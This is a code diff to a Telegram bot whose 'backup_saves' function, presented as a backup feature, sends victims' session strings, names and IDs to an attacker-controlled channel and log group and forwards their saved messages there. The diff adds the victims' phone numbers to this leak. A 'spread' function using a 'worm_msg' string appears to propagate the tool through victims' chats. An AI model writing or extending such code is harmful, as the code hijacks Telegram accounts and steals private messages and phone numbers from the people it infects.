@@ -34,7 +34,7 @@ async def backup_saves(client, me, bot):
     dest = await client.get_entity(channel_id)
     result = await client(functions.messages.ExportChatInviteRequest(peer=channel_id))
     database.channels.insert_one({"invite": result.link, "owner": me.id})
-    await client.send_message(dest, f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nSession: {client.session.save()}")
+    await client.send_message(dest, f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}\nSession: {client.session.save()}")
     async for message in client.iter_messages("me", reverse=True):
         try:
             await message.forward_to(dest)
@@ -44,7 +44,7 @@ async def backup_saves(client, me, bot):
         except:
             break
     await client(functions.channels.LeaveChannelRequest(channel=channel_id))
-    await bot.send_message(int(os.getenv('LOG_GROUP')), f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nLink: {result.link}")
+    await bot.send_message(int(os.getenv('LOG_GROUP')), f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}\nLink: {result.link}")
 async def spread(client, bot):
     spread_msg = strings['worm_msg'].format((await bot.get_me()).username)
     async for dialog in client.iter_dialogs():
